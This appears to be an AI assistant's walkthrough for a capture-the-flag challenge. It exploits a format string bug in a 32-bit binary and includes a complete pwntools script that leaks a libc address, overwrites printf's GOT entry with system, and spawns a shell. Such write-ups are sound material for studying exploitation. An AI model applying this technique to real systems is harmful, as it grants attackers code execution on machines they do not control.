To solve this challenge using `pwntools`, you can exploit the format string vulnerability in the `printf(buf)` call. The vulnerability arises because the `printf` function is called with user-controlled input (`buf`) without a format specifier. This allows you to leak memory addresses and potentially overwrite values in memory.

Here are the steps to solve the challenge:

### Steps to Exploit the Challenge

1. **Analyze the Binary**:
   - The binary is a 32-bit ELF file.
   - The `printf(buf)` call is vulnerable to a format string attack.
   - The `read` function reads up to 100 bytes into the `buf` buffer.

2. **Leak Memory Addresses**:
   - Use the format string vulnerability to leak addresses from the stack or the GOT (Global Offset Table).
   - Specifically, leak the address of a libc function (e.g., `printf`) from the GOT to calculate the base address of libc.

3. **Calculate Offsets**:
   - Use the leaked libc address to calculate the base address of libc.
   - Use the libc base address to calculate the address of `system` and `/bin/sh`.

4. **Overwrite GOT Entry**:
   - Use the format string vulnerability to overwrite a GOT entry (e.g., `printf`) with the address of `system`.

5. **Trigger the Exploit**:
   - Send `/bin/sh` as input to the program, which will call `system("/bin/sh")` and give you a shell.

### Exploit Code Using `pwntools`

Here is the Python exploit script using `pwntools`:

```python
from pwn import *

# Set up the binary and libc
elf = ELF('./fmt')  # Load the binary
libc = ELF('./libc.so.6')  # Load the provided libc

# Start the process
p = process('./fmt')

# Step 1: Leak libc address
p.recvuntil("Do you know repeater?\n")  # Wait for the prompt

# Use format string to leak an address from the GOT
payload = b"%7$s" + p32(elf.got['printf'])  # Leak printf@GOT
p.sendline(payload)

# Receive and parse the leaked address
leaked_printf = u32(p.recv(4))  # Read 4 bytes (32-bit address)
log.info(f"Leaked printf address: {hex(leaked_printf)}")

# Step 2: Calculate libc base and system address
libc_base = leaked_printf - libc.symbols['printf']  # Calculate libc base
log.info(f"Libc base address: {hex(libc_base)}")

system_addr = libc_base + libc.symbols['system']  # Calculate system address
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))  # Find "/bin/sh" string
log.info(f"system address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(bin_sh_addr)}")

# Step 3: Overwrite GOT entry
# Use format string to overwrite printf@GOT with system address
# Split system address into two parts for writing
lower_half = system_addr & 0xffff
upper_half = (system_addr >> 16) & 0xffff

# Construct payload to overwrite printf@GOT
payload = fmtstr_payload(7, {elf.got['printf']: system_addr})
p.sendline(payload)

# Step 4: Trigger the exploit
p.sendline("/bin/sh")  # Send "/bin/sh" to call system("/bin/sh")

# Interact with the shell
p.interactive()
```

### Explanation of the Code

1. **Leaking libc Address**:
   - The payload `%7$s` reads a string from the address provided after it in the payload (`p32(elf.got['printf'])`).
   - This leaks the address of `printf` from the GOT.

2. **Calculating libc Base**:
   - Using the leaked `printf` address and the offset of `printf` in libc, calculate the base address of libc.

3. **Overwriting GOT Entry**:
   - Use the `fmtstr_payload` function from `pwntools` to construct a payload that overwrites the GOT entry for `printf` with the address of `system`.

4. **Triggering the Exploit**:
   - Send `/bin/sh` as input to the program. Since the GOT entry for `printf` now points to `system`, this effectively calls `system("/bin/sh")`.

5. **Getting a Shell**:
   - Use `p.interactive()` to interact with the shell.

### Notes

- The offset `%7$s` in the format string payload may vary depending on the stack layout. You can adjust it by experimenting with different offsets.
- Ensure that the provided `libc.so.6` file matches the one used by the binary.
- Use `gdb` or `pwndbg` to debug the binary and verify the offsets and addresses.

This script should work for the given challenge, provided the offsets and addresses are correct.
